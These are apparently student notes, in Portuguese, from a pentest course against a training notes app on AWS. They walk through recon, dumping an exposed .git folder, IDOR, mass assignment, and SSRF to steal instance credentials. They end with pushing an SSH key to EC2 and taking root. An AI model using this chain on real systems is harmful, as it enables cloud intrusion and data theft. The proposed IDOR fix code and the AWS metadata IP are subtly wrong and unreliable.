# Anotações

`Os testes realizado na aplicação web de notas hospedada na cloud AWS, resultando no acesso ao console de gerenciamento da AWs`

Durante as 4 aulas realizamos teste de intrusão, encontrando vulnerabilidades de:

- git exposed
- IDOR
- SSRF
- Mass assignment

Os desafios:

- Fuzzing: git exposed
- Code review
- IDOR: acesso a notas de outros usuários
- Mass assignment: permitiu a alteração do usuário para admin, conseguindo com sucesso acesso ao webhook.
- SSRF: acesso as credenciais da instância da AWS e conseguimos acessar aos arquivos no S3
- EC2: conectamos na instância EC2
- Acesso servidor: enviamos a chave shh para o servidor e conseguimos o acesso ao servidor desse cliente na AWS
- privesc: 


## Dia 01 - Recon Scritps

Reconhecimento da aplicação.
É uma parte fundamental para encontramos vulnerabilidades. Quanto mais soubemos sobre a aplicação mas vulnerabilidades podemos encontramos.

O que podemos encontrar nessa etapa:

- Portas, IP, servidores em execução.
- Quais tecnologias existem no site.
- Mapear pasta, diretórios e rotas.

target: <https://notes.webhacking.com.br>

### Portas, IP, servidores em execução

#### Quais portas existem nesse servidor?

NMAP seleciona as 100 portas mais comuns

```bash
nmap notes.webhacking.com.br -v
# roda o nmap sem parâmetros, só com o modo verbose
# pra realizar um scan
```

```bash
PORT      STATE  SERVICE    REASON
21/tcp    open   ftp        syn-ack
22/tcp    open   ssh        syn-ack
25/tcp    open   smtp       syn-ack
53/tcp    open   domain     syn-ack
80/tcp    open   http       syn-ack
110/tcp   open   pop3       syn-ack
143/tcp   open   imap       syn-ack
443/tcp   open   https      syn-ack
465/tcp   open   smtps      syn-ack
587/tcp   open   submission syn-ack
993/tcp   open   imaps      syn-ack
995/tcp   open   pop3s      syn-ack
3306/tcp  open   mysql      syn-ack
5432/tcp  closed postgresql conn-refused
8443/tcp  open   https-alt  syn-ack
12000/tcp closed cce4x      conn-refused
```

#### Endereço IP da aplicação

> ping notes.webhacking.com.br

```bash
PING notes.webhacking.com.br (52.2.30.210) 56(84) bytes of data.
```

#### Servidor

Nem sempre o endereço ip será o servidor de fato da aplicação

[ipinfo.io](http://ipinfo.io)

Servidor tá hospedado na AWS 52.2.30.210 - na AWS - us-east-1 (us-east-1a) (us-east-1b)</br>
(zonas de disponibilidade)

> AWS 52.2.30.210 - na AWS - us-east-1 (us-east-1a) (us-east-1b)

![servidor](/shw/pics/servidor-descobrir.png)

#### Acessando na porta 80

Retornou o PHP info:

```bash
Nome interno: ip-172-31-17-141
OS: Ubuntu
PHP: 8.1.2-1ubuntu2.8
Apache 2.0 Handler - Apache/2.4.52
Arquivo de configuracao do PHP: /etc/php/8.1/apache2/php.ini
Usuario do apache: www-data
IP privado 172.31.17.141
```

> Aplicação está hospedada aqui: **/var/www/html**

Apache esta configurado pra ver um vhost (host virtual), por isso ao abrir pelo ip aparece o php info.

vhost: é a forma de usar o mesmo servidor para diversas aplicações.

Para saber para onde encaminhar a requisição, ele verifica o campo header da requisição, campo host.

### Quais tecnologias existem nesse site?

Análise manual pelo view page source, descobrimos que o site utiliza as tecnologias:

> Tailwind CSS, Jquery

### Mapear pasta, diretórios e rotas

Análise pela ferramenta **wfuzz**

```bash
wfuzz -c -z file,common.txt --hc 404 https://notes.webhacking.com.br/FUZZ
# não exibi resultados com status 404 --hc 404
# -c modo colorido
# -z qual wordlist utilizar (passando o tipo e o caminho)
# /FUZZ vai pegar cada item da lista e vai colocar no lugar de FUZZ
```

```bash
000000025:   403        9 L      28 W       289 Ch      ".htpasswd"  
000000024:   403        9 L      28 W       289 Ch      ".htaccess"  
000000023:   403        9 L      28 W       289 Ch      ".hta"       
000000013:   301        9 L      28 W       339 Ch      ".git/logs/" 
000000930:   301        9 L      28 W       336 Ch      "build"      
000001038:   301        9 L      28 W       337 Ch      "cgi-bin/"   
000001758:   200        0 L      0 W        0 Ch        "favicon.ico"
000002085:   302        11 L     22 W       394 Ch      "home"       
000002193:   200        136 L    581 W      8073 Ch     "index.php"  
000002511:   200        113 L    241 W      5370 Ch     "login"      
000002525:   405        154 L    31416 W    881696 Ch   "logout"     
000002845:   302        11 L     22 W       394 Ch      "notes"      
000003474:   200        114 L    251 W      5415 Ch     "register"   
000003569:   200        2 L      3 W        24 Ch       "robots.txt" 
000003710:   403        9 L      28 W       289 Ch      "server-status"
```

Agora pelo ip

```bash
wfuzz -c -z file,common.txt --hc 404 https://52.2.30.210/FUZZ
```

```bash
000000025:   403        9 L      28 W       277 Ch      ".htpasswd"       
000000023:   403        9 L      28 W       277 Ch      ".hta"            
000000024:   403        9 L      28 W       277 Ch      ".htaccess"       
000000013:   301        9 L      28 W       315 Ch      ".git/logs/"      
000000930:   301        9 L      28 W       312 Ch      "build"           
000001038:   301        9 L      28 W       313 Ch      "cgi-bin/"        
000001758:   200        0 L      0 W        0 Ch        "favicon.ico"     
000002085:   302        11 L     22 W       346 Ch      "home"            
000002193:   200        136 L    581 W      8073 Ch     "index.php"       
000002511:   200        113 L    241 W      5262 Ch     "login"           
000002525:   405        154 L    31416 W    881648 Ch   "logout"          
000002845:   302        11 L     22 W       346 Ch      "notes"           
000003474:   200        114 L    251 W      5319 Ch     "register"        
000003569:   200        2 L      3 W        24 Ch       "robots.txt"      
000003710:   403        9 L      28 W       277 Ch      "server-status"
```

```bash
http://52.2.30.210/.git/logs/HEAD # Possivel vulnerabilidade
```

![git logs](/shw/pics/git-logs.png)

### Explorando ./git/logs/HEAD

![GIT HEAD](/shw/pics/git-head.png)

Temos os commits que foram feitos para build e publicar aplicação no servidor.  

### Git exposed

Primeira vulnerabilidade e encontramos a flag.

> swh{fsdfsdfsdf}

Com a pasta .git exposta, conseguimos ter acesso a código fonte da aplicação (próxima aula).

## Dia 02 - Análise e identificação de vulnerabilidades

Identificar → analisar → explorar

Na identificação do diretório **./git/**, foi feito Code Review e depois a exploração.

### Resumo

Vulnerabilidades encontradas:

- **IDOR** (Insecure Direct Object Reference) - Não verifica o usuário autenticado, permite acesso a conteúdo de outro usuário.
- **SSRF** (Server Side Request Forgery) - pode levar ao comprometimento do servidor e da rede do cliente.
- **Mass Assignment** - é possível editar qualquer campo no perfil do usuário.

**Desafio**: Explorar a vulnerabilidade IDOR

![flag desafio 02](/shw/pics/flag02.png)

### Detalhe da exploração

```markdown
#### Material da aula

https://tattered-cushion-387.notion.site/AV-Code-Review-26a169068a254202b48217f15e2b8b14

https://owasp.org/Top10/

https://owasp.org/www-project-api-security/

https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html

http://www.pentest-standard.org/index.php/Main_Page
```

#### Identificar → analisar → explorar

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6540a517-05b4-4a69-a51a-87c8577b6ad4/Untitled.png)

Git → podemos reversionar e voltar o que era antes.

```markdown
Qual o risco de uma pasta como essa tá expostar no servidor?
```

Arquivo zlib → descontactar e dentro dele tem as alterações feito no “nesse commit”

```bash
zlib-flate: sudo apt-get install qpdf

zlib-falt -uncompress < hashDoCommit > a

# ira descompactar e add/criar no arquio a

file a
# exemplo: a: Git commit 277

cat a
# retorna histórico do commit/todos os arquivos
```

dotgit → extensão identifica se a pasta .git tá exposta

Você pode configurar outras pastas, por exemplo: .env

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e504ef67-614f-4431-a175-df881f99b713/Untitled.png)

#### Baixar pasta /.git de um site

##### **→ Instalar ferramenta git-dumper**

```bash
# git-dumper 
git clone https://github.com/carlosevieira/git-dumper

cd git-dumper

pip3 install -r requirements.txt 
# instalar as bibliotecas
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4b19484b-80f9-4376-a307-433937dd3c3b/Untitled.png)

##### **→ Rodar o script**

```bash
python3 git_dumper.py URL pastaParaGravarOutput

python3 git_dumper.py http://52.2.30.210/ notes
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a2c8e383-1aaa-4a62-80ec-67b550a0aaf3/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/188e4bf2-49e2-4047-b560-c7ef752e5c40/Untitled.png)

Temos uma boa parte do código fonte. Agora podemos fazer o code review.

#### → **Code review**

**Analisando o arquivo `.env`:**

Credenciais vazadas: 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f91e87b6-48cc-4405-ba52-43f1f22d7616/Untitled.png)

Nunca commitar o arquivo .env no git!

<aside>
💡 O **.env** deve ser usado apenas em desenvolvimento(ambiente local) e em produção devem estarem setadas como variáveis de ambiente no servidor.

</aside>

**→ Readme.md**

- Logo do laravel, informando o que ele é.

**→ Estrutura do laravel**

**`App`** → terá as controllers, middleware e models.

Modelo MVC → separar em 3 partes. 

- Model: responsável por interagir com o banco de dados. Ou seja, para pegar dados p atualizar, gravar ou deletar os dados do banco de dados.
- Controller: responsável por controlar a aplicação. Coletar do banco de dados, o que deve ou não exibir para o usuário, qual ação tomar. É onde normalmente fica a lógica do negócio.
- View: é a tela que o usuário final irá ver.

View: exiba meu nome → solicita para controller → controller busca no banco de dados (pela model) → faz a renderização da view, para exibir o seu nome.

**Vulnerabilidade para exibir notas:**

Qualquer usuário pode exibir uma nota.

Ou seja, qualquer usuário que chamar essa function **show**, poderá exibir notas de outro usuário.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2d464b67-24a0-4133-ba8b-dd993332de37/Untitled.png)

Deveria ter uma condição: -> where('user', 'id', auth() -> id())

```php
/**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        $note = Note::find($id)-> where('user', 'id', auth() -> id());
        return Response()->json($note);
    }
```

A mesma coisa vale para edit:

```php
/**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        $note = Note::find($id);
        return view('notes.edit', compact('note'));
    }
```

Exemplo: loguei na minha conta e editei uma nota. Ela tem o **id 23**

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a70ecaac-36a9-45bd-8450-8d319da26b13/Untitled.png)

Mudei para 100 e ela existe e eu consigo ler e editar notas de outros usuários.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ee9f9038-c385-47b7-874e-b862b5281112/Untitled.png)

 É uma vulnerabilidade: **IDOR** = Insecure Direct Object Reference.

É uma function insegura porque ela não valida se a nota é minha ou não é. Ou seja, se é a nota do usuário autenticado.

Deveria verificar se a nota é do usuário autenticado:

`**if($note->user_id == auth()->id()){..}**`

```php
/**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        $note = Note::find($id);
        if($note->user_id == auth()->id()){
            return view('notes.edit', compact('note'));
        }else{
            echo " Voce nao tem permissao";
        }
        
    }
```

<aside>
💡 Vulnerabilidade **IDOR** nas funções show e edit da NotesController

</aside>

**Sanitização**: estamos fazendo uma req http para uma url que o usuario controla, podendo levar a uma vulnerabilidade conhecida como **SSRF** (server side request forgery)⇒ é uma vulnerabilidade que permite que vc faça requisições se passando pelo servidor.

O usuario controla para onde essa requisição http vai ser feita, não valida se pode ou não. 

- url == [http://localhost](http://localhost)
- url == [http://10.40.2.120](http://10.40.2.120) IP dentro da rede do cliente (requisição da dentro do servidor da empresa)
- url == [http://169.254.169.245](http://169.254.169.245) IP metadados da AWS
- Pode fazer requisição para qualquer site que ele quiser.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5d03c9b1-9dfe-4ced-87f4-6eb3b8e60803/Untitled.png)

<aside>
💡 SSRF  (Server Side Request Forgery) que pode levar ao comprometimento do servidor e da rede do cliente.

</aside>

**UPDATE**

rota:

```php
Route::get('/user/me', [App\Http\Controllers\UserController::class, 'show'])->name('user.show')->middleware('auth');
Route::put('/user/me', [App\Http\Controllers\UserController::class, 'update'])->name('user.update')->middleware('auth');
```

Req GET:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/98f55a11-d337-498a-9b27-23cbc048c3fa/Untitled.png)

Chama a **function show**

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b11ff3e6-e8b7-431c-8807-e245d4451cdc/Untitled.png)

Req PUT

**Mass Assignment** - é possível editar qualquer campo no perfil do usuário.

Pego todos os dados que o usuario me enviou(front-back), passando tudo pro banco de dados atualizar. Permite que o usuário altere campos que ele não deveria atualizar.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/467f1f8e-dda4-4e18-a1e5-311e45ef5423/Untitled.png)

site para encontrar exemplos no github [https://grep.app/search?q=update(%24request->all())](https://grep.app/search?q=update%28%24request-%3Eall%28%29%29)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d98a4845-423d-496c-92e3-577d797c3d48/Untitled.png)

#### Desafio

Encontrar a vulnerabilidade IDOR em uma das notas:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2f1888cd-2a01-4496-85c8-c8d69aa1294c/Untitled.png)

Flag encontrada:

**`swh{1D0R_1s_Th3_N3w_SQL1_N3w_Fl4g}`**

## Dia 03 - Exploração / Invasão

Exploração a vulnerabilidade de SSRF e acesso a AWS.

**CSRF**: tentativa de falsificação de requisição.
Bloqueado pelo Laravel, que utiliza de duas validações:

- Cookie: **XSRF-TOKEN**
- **_token**, gerado randomicamente a cada novo post.

**Burp** suite: tentativa de falsificação de requisição.
Com o burp conseguimos realizar com sucesso:

- Listamos e alteramos campos do usuario. Alterando o tipo de usuário para usuário admin. Vulnerabilidade foi permitida porque não tinha restrição de campo que impeça a alteração do tipo de usuário.
- Acesso IAM. Como acesso ao IAM, conseguimos pegar o servidor atrelado ao perfil e as credenciais:

```bash
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN
```

**Acesso AWS**
Utilizamos AWS CLI, add as credenciais e realizamos uma chamada direita entre nós e AWS:

```bash
aws sts get-caller-identity #verifica se a chave tá funcionando e quem somos nós na AWS
```

Retornando:

```js
{
  UserId, 
  Account,
  Arn
}
```

Testamos o acesso ao S3

```bash
aws s3 ls
```

Retornando com sucesso.

**Desafio**: Encontrar a flag que tá no bucket em user-data.txt

**Solução**: Pesquisei como eu poderia copiar um arquivo do Bucket para a minha máquina.
Encontrei sobre o [CP](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/cp.html).

Basicamente eu chamaria o cp passando o Bucket com o . --recusive, assim eu copiaria tudo do Bucket para a minha máquina.</br>

Depois fiz um cat no arquivo user-data.txt, encontrando a flag.

![flag desafio 03](/shw/pics/flag03.png)

## Dia 04 - Pós-Exploração na AWS

- Listar sevidores(ec2)

```bash
aws ec2 describe-instances
```

![ec2 IP](/shw/pics/ec2-ip-new.png)

Colocamos a lista em leitor de JSON

![lista json](/shw/pics/ec2-retorno-ip.png)

Ao listar ec2, vimos IP que não conhecemos, fizemos um nmap e depois nmap sem o ping.

- Conectar instância EC2:

```bash
ec2-instace-connect help
```

![ec2 help](/shw/pics/ec2.help.png)

EC2 permite que o administrador de sistema envie uma chave ssh publica deles para um servidor.

Olhamos o que precisamos enviar para ter esse acesso:

```bash
aws ec2-instance-connect send-ssh-public-key help
```

![send-ssh-help](/shw/pics/send-ssh-help.png)

```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id i-1234567890abcdef0 \
--instance-os-user ec2-user \
--availability-zone us-east-2b \
--ssh-public-key file://path/my-rsa-key.pub
```

- Precisamos criar chave ssh (só crie se você não tiver uma)

```bahs
ssh-keygen
```

- Precisamos enviar chave publica para o servidor.

```bash
aws ec2-instance-connect send-ssh-public-key --instance-id i-032802861b7c9c59c --instance-os-user ec2-user --ssh-public-key file:///home/kali/.ssh/id_rsa.pub --availability-zone us-east-1a --region us-east-1
```

- instance-id e availability-zone são daquele IP que não conhecemos.

![dados ip](/shw/pics/dado-ip.png)

- Chave enviada com sucesso

![chave enviada](/shw/pics/ec2-send-key-ok.png)

- Agora vamos conectar com o servidor passando a chave ssh(chave privada)

```bash
ssh -i /home/kali/.ssh/id_rsa ec2-user@44.202.22.33
```

![aws](/shw/pics/acessando-aws.png)

**Desafio**: Virar usuario root da máquina
**Solução**:

- sudo passwd root : para mudar a senha do root
- su - : coloquei a nova senha
- ls -la: listei diretórios
- cat root.txt : encontrei a flag

![flag desafio 04](/shw/pics/flag04.png)
